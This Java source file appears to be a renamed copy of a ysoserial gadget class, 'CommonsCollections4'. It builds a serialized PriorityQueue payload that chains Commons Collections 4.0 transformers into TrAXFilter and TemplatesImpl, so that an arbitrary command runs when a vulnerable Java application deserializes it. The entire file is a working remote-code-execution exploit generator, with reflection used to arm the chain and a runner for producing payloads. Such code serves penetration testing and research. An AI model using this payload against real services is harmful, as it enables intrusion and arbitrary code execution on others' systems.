package dogeser.payloads;

import java.util.PriorityQueue;
import java.util.Queue;

import javax.xml.transform.Templates;

import dogeser.payloads.annotation.Authors;
import dogeser.payloads.annotation.Dependencies;
import dogeser.payloads.util.Gadgets;
import dogeser.payloads.util.PayloadRunner;
import dogeser.payloads.util.Reflections;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

/*
 * Variation on CommonsCollections2 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */
@SuppressWarnings({ "rawtypes", "unchecked", "restriction" })
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@dogeser.payloads.annotation.Authors({ Authors.FROHOFF })
public class CommonsCollections4 implements ObjectPayload<Queue<Object>> {

	public Queue<Object> getObject(final String command) throws Exception {
		Object templates = Gadgets.createTemplatesImpl(command);

		ConstantTransformer constant = new ConstantTransformer(String.class);

		// mock method name until armed
		Class[] paramTypes = new Class[] { String.class };
		Object[] args = new Object[] { "foo" };
		InstantiateTransformer instantiate = new InstantiateTransformer(
				paramTypes, args);

		// grab defensively copied arrays
		paramTypes = (Class[]) dogeser.payloads.util.Reflections.getFieldValue(instantiate, "iParamTypes");
		args = (Object[]) dogeser.payloads.util.Reflections.getFieldValue(instantiate, "iArgs");

		ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });

		// create queue with numbers
		PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
		queue.add(1);
		queue.add(1);

		// swap in values to arm
		Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
		paramTypes[0] = Templates.class;
		args[0] = templates;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections4.class, args);
	}
}
